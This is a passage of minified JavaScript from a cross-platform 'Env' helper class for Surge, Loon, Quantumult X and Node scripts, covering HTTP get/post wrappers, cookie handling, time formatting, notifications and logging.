			t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]),
			this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
						"X-Surge-Skip-Scripting": !1
					})), $httpClient.get(t, (t, s, i) => {
					!t && s && (s.body = i, s.statusCode = s.status),
					e(t, s, i)
				})) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
						hints: !1
					})), $task.fetch(t).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
					try {
						if (t.headers["set-cookie"]) {
							const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
							s && this.ckjar.setCookieSync(s, null),
							e.cookieJar = this.ckjar
						}
					} catch (t) {
						this.logErr(t)
					}
				}).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => {
					const {
						message: s,
						response: i
					} = t;
					e(s, i, i && i.body)
				}))
		}
		post(t, e = (() => {})) {
			if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon())
				this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
						"X-Surge-Skip-Scripting": !1
					})), $httpClient.post(t, (t, s, i) => {
					!t && s && (s.body = i, s.statusCode = s.status),
					e(t, s, i)
				});
			else if (this.isQuanX())
				t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
						hints: !1
					})), $task.fetch(t).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => e(t));
			else if (this.isNode()) {
				this.initGotEnv(t);
				const {
					url: s,
					...i
				} = t;
				this.got.post(s, i).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => {
					const {
						message: s,
						response: i
					} = t;
					e(s, i, i && i.body)
				})
			}
		}
		time(t, e = null) {
			const s = e ? new Date(e) : new Date;
			let i = {
				"M+": s.getMonth() + 1,
				"d+": s.getDate(),
				"H+": s.getHours(),
				"m+": s.getMinutes(),
				"s+": s.getSeconds(),
				"q+": Math.floor((s.getMonth() + 3) / 3),
				S: s.getMilliseconds()
			};
			/(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
			for (let e in i)
				new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
			return t
		}
		msg(e = t, s = "", i = "", r) {
			const o = t => {
				if (!t)
					return t;
				if ("string" == typeof t)
					return this.isLoon() ? t : this.isQuanX() ? {
						"open-url": t
					}
				 : this.isSurge() ? {
					url: t
				}
				 : void 0;
				if ("object" == typeof t) {
					if (this.isLoon()) {
						let e = t.openUrl || t.url || t["open-url"],
						s = t.mediaUrl || t["media-url"];
						return {
							openUrl: e,
							mediaUrl: s
						}
					}
					if (this.isQuanX()) {
						let e = t["open-url"] || t.url || t.openUrl,
						s = t["media-url"] || t.mediaUrl;
						return {
							"open-url": e,
							"media-url": s
						}
					}
					if (this.isSurge()) {
						let e = t.url || t.openUrl || t["open-url"];
						return {
							url: e
						}
					}
				}
			};
			if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
				let t = ["", "==============📣系统通知📣=============="];
				t.push(e),
				s && t.push(s),
				i && t.push(i),
				console.log(t.join("\n")),
				this.logs = this.logs.concat(t)
			}
		}
		log(...t) {
			t.length > 0 && (this.logs = [...this.logs, ...t]),
			console.log(t.join(this.logSeparator))
		}
		logErr(t, e) {
			const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
			s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
		}
		wait(t) {
			return new Promise(e => setTimeout(e, t))
		}
		done(t = {}) {
			const e = (new Date).getTime(),
			s = (e - this.startTime) / 1e3;
			this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`),
			this.log(),
			(this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
		}
	}
	(t, e)
}
